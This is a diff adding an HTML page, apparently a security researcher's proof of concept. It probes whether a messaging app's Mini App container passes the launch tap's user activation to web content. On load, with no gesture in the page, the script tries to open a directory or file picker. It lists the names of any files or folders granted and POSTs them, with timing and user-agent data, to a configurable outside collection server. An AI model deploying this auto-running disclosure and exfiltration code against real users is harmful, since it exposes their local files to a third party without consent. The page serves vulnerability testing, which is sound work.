@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Zero-Gesture File Picker</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d1117;color:#c9d1d9;padding:12px;font-size:14px}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:15px;max-width:720px;margin:0 auto 12px}
+h2{font-size:16px;color:#58a6ff;margin-bottom:3px}
+.sub{font-size:11px;color:#8b949e;line-height:1.55;margin-bottom:10px}
+.big{border-radius:10px;padding:14px;margin:10px 0;font-weight:700;text-align:center;font-size:14px;line-height:1.5}
+.b-yes{background:#2d1214;color:#ff7b72}.b-no{background:#0f5323;color:#7ee787}.b-wait{background:#21262d;color:#8b949e}
+.row{display:flex;gap:8px;font-size:12px;padding:4px 0;border-bottom:1px solid #21262d}
+.row b{min-width:190px;color:#8b949e;font-weight:500;flex-shrink:0}
+.row span{font-family:ui-monospace,monospace;word-break:break-all}
+.hot{color:#ff7b72;font-weight:700}.cool{color:#7ee787}.warn{color:#e3b341}
+button{width:100%;border:none;border-radius:8px;padding:10px;font-size:13px;font-weight:600;color:#fff;background:#30363d;margin-top:6px}
+pre{background:#010409;border-radius:6px;padding:8px;font-size:10.5px;max-height:260px;overflow:auto;color:#8b949e;margin-top:8px;white-space:pre-wrap}
+input{width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:8px;padding:7px;font-size:12px;font-family:ui-monospace,monospace;margin-bottom:6px}
+code{background:#21262d;padding:1px 5px;border-radius:4px;font-size:.85em}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>Zero-Gesture File Picker</h2>
+  <p class="sub">Tests whether a Mini App receives <b>user activation it never earned</b> — inherited from
+  the native "Open App" tap — and whether that is enough to open a file/directory picker on load with
+  <b>no interaction inside the page</b>.
+  <br><br>Key instrument: <code>navigator.userActivation</code>. If <code>isActive</code> is
+  <b>true at t=0</b> while the page has received no events, the container handed activation to
+  attacker-controlled content.
+  <br><br>Order: <code>?first=dir</code> (default) · <code>file</code> · <code>input</code>. Each attempt
+  consumes transient activation, so only the first is a clean test — re-open the Mini App to try another.</p>
+  <input id="srv" placeholder="server .../log">
+  <div class="big b-wait" id="verdict">measuring…</div>
+  <div id="env"></div>
+  <button onclick="mapWindow()">Map activation lifetime (poll 100ms)</button>
+  <button onclick="retry('dir')">retry · directory</button>
+  <button onclick="retry('file')">retry · file</button>
+  <button onclick="retry('input')">retry · input[type=file].click()</button>
+  <pre id="log"></pre>
+</div>
+<input type="file" id="fi" multiple style="display:none">
+<script>
+const T0 = performance.now();
+const Q = new URLSearchParams(location.search);
+const safeLS = k=>{try{return localStorage.getItem(k)}catch(e){return null}};
+let SRV = Q.get('srv') || safeLS('oracle_srv') || '';
+document.getElementById('srv').value = SRV;
+document.getElementById('srv').onchange = e=>{SRV=e.target.value.replace(/\/$/,'');try{localStorage.setItem('oracle_srv',SRV)}catch(_){}};
+
+const R = { origin: location.origin, ua: navigator.userAgent, t0: Date.now(),
+            activation: {}, attempts: [], disclosure: null };
+const L = [];
+function lg(m){ const t=Math.round(performance.now()-T0);
+  L.push(`[+${String(t).padStart(5)}ms] ${m}`);
+  document.getElementById('log').textContent = L.slice(-70).join('\n'); }
+function row(k,v,cls){ const d=document.createElement('div'); d.className='row';
+  const b=document.createElement('b'); b.textContent=k;
+  const s=document.createElement('span'); s.textContent=String(v); if(cls) s.className=cls;
+  d.appendChild(b); d.appendChild(s); document.getElementById('env').appendChild(d); }
+async function post(type,data){ if(!SRV) return;
+  try{ await fetch(SRV+'?type='+type,{method:'POST',
+    headers:{'Content-Type':'application/json','ngrok-skip-browser-warning':'true'},
+    body:JSON.stringify({...data,_ts:Date.now(),ua:navigator.userAgent,href:location.href})}); }catch(e){}
+}
+
+// ---------- 0. THE MEASUREMENT: did we inherit activation we never earned?
+// No event has reached this page yet — script runs during parse.
+let INHERITED = null;
+try{
+  const ua = navigator.userActivation;
+  if (ua) { INHERITED = { isActive: ua.isActive, hasBeenActive: ua.hasBeenActive }; }
+}catch(e){ INHERITED = {error:e.name}; }
+R.activation.atLoad = INHERITED;
+
+// Prove no page event caused it: count every input event we ever see.
+let pageEvents = 0;
+['click','pointerdown','pointerup','mousedown','mouseup','keydown','touchstart','contextmenu','auxclick','pointermove','mousemove']
+  .forEach(n => window.addEventListener(n, ()=>{ pageEvents++; }, {capture:true, passive:true}));
+R.activation.pageEventsBeforeAttempt = 0;
+
+// ---------- helpers
+function actNow(){ try{ const u=navigator.userActivation;
+  return u ? {isActive:u.isActive, hasBeenActive:u.hasBeenActive} : null; }catch(e){ return null; } }
+
+async function tryDirectory(tag){
+  if (typeof window.showDirectoryPicker !== 'function')
+    return {tag, api:'showDirectoryPicker', available:false};
+  const a=actNow(); const t=performance.now();
+  try{
+    const dir = await window.showDirectoryPicker({mode:'read'});
+    const ms=Math.round(performance.now()-t);
+    const entries=[]; let n=0;
+    try{ for await (const [name,h] of dir.entries()){ entries.push(`${h.kind}:${name}`); if(++n>=60) break; } }catch(e){}
+    lg(`DIRECTORY GRANTED "${dir.name}" — ${entries.length} entries`);
+    R.disclosure = {kind:'directory', name:dir.name, count:entries.length, entries};
+    return {tag, api:'showDirectoryPicker', opened:true, granted:true, ms, activationBefore:a,
+            dirName:dir.name, entryCount:entries.length, entries};
+  }catch(e){
+    const ms=Math.round(performance.now()-t);
+    const gated = /activation|gesture/i.test(e.message||'') ||
+                  e.name==='SecurityError' || e.name==='InvalidStateError' || e.name==='NotAllowedError';
+    return {tag, api:'showDirectoryPicker', opened:!gated, granted:false, ms, activationBefore:a,
+            error:e.name, message:(e.message||'').slice(0,150)};
+  }
+}
+async function tryFile(tag){
+  if (typeof window.showOpenFilePicker !== 'function')
+    return {tag, api:'showOpenFilePicker', available:false};
+  const a=actNow(); const t=performance.now();
+  try{
+    const hs = await window.showOpenFilePicker({multiple:true});
+    const ms=Math.round(performance.now()-t);
+    const files=[];
+    for(const h of hs){ try{ const f=await h.getFile();
+      files.push({name:f.name,size:f.size,type:f.type}); }catch(e){} }
+    lg(`FILES GRANTED — ${files.map(f=>f.name).join(', ')}`);
+    R.disclosure = {kind:'files', files};
+    return {tag, api:'showOpenFilePicker', opened:true, granted:true, ms, activationBefore:a, files};
+  }catch(e){
+    const ms=Math.round(performance.now()-t);
+    const gated = /activation|gesture/i.test(e.message||'') ||
+                  e.name==='SecurityError' || e.name==='InvalidStateError' || e.name==='NotAllowedError';
+    return {tag, api:'showOpenFilePicker', opened:!gated, granted:false, ms, activationBefore:a,
+            error:e.name, message:(e.message||'').slice(0,150)};
+  }
+}
+// The legacy path that reportedly fired on Windows tdesktop with no page gesture.
+function tryInput(tag){
+  return new Promise(res=>{
+    const a=actNow(); const t=performance.now(); const el=document.getElementById('fi');
+    let settled=false;
+    const done=(o)=>{ if(settled) return; settled=true; res({tag, api:'input[type=file].click()',
+      activationBefore:a, ms:Math.round(performance.now()-t), ...o}); };
+    el.onchange = ()=>{ const files=[...el.files].map(f=>({name:f.name,size:f.size,type:f.type}));
+      lg(`INPUT PICKER returned ${files.length} file(s)`);
+      R.disclosure = {kind:'input-files', files}; done({opened:true, granted:true, files}); };
+    // blur => a native dialog took focus => the picker opened
+    const onblur = ()=>{ lg('window blur — a native dialog appears to have opened'); done({opened:true, granted:false, note:'blur observed (picker opened, not yet completed)'}); };
+    window.addEventListener('blur', onblur, {once:true});
+    try{ el.click(); }catch(e){ done({opened:false, error:e.name, message:e.message}); }
+    setTimeout(()=>done({opened:false, note:'no blur, no change within 3.5s — picker did not open'}), 3500);
+  });
+}
+
+async function attempt(kind, tag){
+  R.activation.pageEventsBeforeAttempt = pageEvents;
+  const r = kind==='dir' ? await tryDirectory(tag)
+          : kind==='file'? await tryFile(tag)
+          :                await tryInput(tag);
+  R.attempts.push(r);
+  lg(`${tag} [${r.api}] opened=${r.opened} granted=${!!r.granted} ${r.error||''} act=${JSON.stringify(r.activationBefore)}`);
+  render(); post('ZERO_GESTURE_PICKER', r);
+  return r;
+}
+function retry(kind){ attempt(kind, 'retry-'+kind+'-BUTTON(has gesture)'); }
+
+function render(){
+  document.getElementById('env').innerHTML='';
+  const a=R.activation.atLoad||{};
+  row('userActivation.isActive @load', a.isActive, a.isActive?'hot':'cool');
+  row('userActivation.hasBeenActive @load', a.hasBeenActive, a.hasBeenActive?'hot':'cool');
+  row('page input events so far', pageEvents, pageEvents?'warn':'cool');
+  row('showDirectoryPicker', typeof window.showDirectoryPicker==='function');
+  row('showOpenFilePicker', typeof window.showOpenFilePicker==='function');
+  row('now isActive', JSON.stringify(actNow()));
+  const win = R.attempts.find(x=>x.granted);
+  const openedNoGesture = R.attempts.some(x=>x.opened && (x.tag||'').startsWith('AUTO'));
+  const v=document.getElementById('verdict');
+  if (win && (win.tag||'').startsWith('AUTO')){
+    v.className='big b-yes';
+    v.innerHTML = `ZERO-GESTURE DISCLOSURE — ${win.api} returned data with no interaction in the page`+
+      (R.disclosure?.entries?`<br><span style="font-weight:400;font-size:12px">${R.disclosure.name}: ${R.disclosure.entries.slice(0,12).join(', ')}</span>`:'')+
+      (R.disclosure?.files?`<br><span style="font-weight:400;font-size:12px">${R.disclosure.files.map(f=>f.name).join(', ')}</span>`:'');
+  } else if (openedNoGesture){
+    v.className='big b-yes';
+    v.innerHTML='PICKER OPENED WITH NO PAGE GESTURE — activation was inherited from the app launch.<br>'+
+      '<span style="font-weight:400;font-size:12px">Selection still required to disclose data.</span>';
+  } else if (a.isActive === true){
+    v.className='big b-yes';
+    v.innerHTML='ACTIVATION INHERITED (isActive=true at load, zero page events) — the container handed '+
+      'activation to attacker content, even if this attempt did not open a picker.';
+  } else {
+    v.className='big b-no';
+    v.textContent='No inherited activation; picker gated as expected.';
+  }
+}
+
+function mapWindow(){
+  lg('mapping activation lifetime…');
+  let n=0; const iv=setInterval(()=>{
+    const a=actNow(); n++;
+    lg(`t+${n*100}ms isActive=${a?a.isActive:'?'}`);
+    if(!a || a.isActive===false || n>60){ clearInterval(iv); lg('activation expired or unavailable');
+      post('ZERO_GESTURE_ACTIVATION_MAP',{samples:n, last:a}); }
+  },100);
+}
+
+// ---------- run immediately: no user event has occurred in this page
+lg(`load. userActivation @t0 = ${JSON.stringify(INHERITED)}  pageEvents=${pageEvents}`);
+render();
+const FIRST = (Q.get('first')||'dir').toLowerCase();
+lg(`AUTO attempt order: ${FIRST} (change with ?first=dir|file|input)`);
+attempt(FIRST, 'AUTO-no-gesture-'+FIRST).then(()=>{ post('ZERO_GESTURE_SUMMARY', R); });
+</script>
+</body>
+</html>
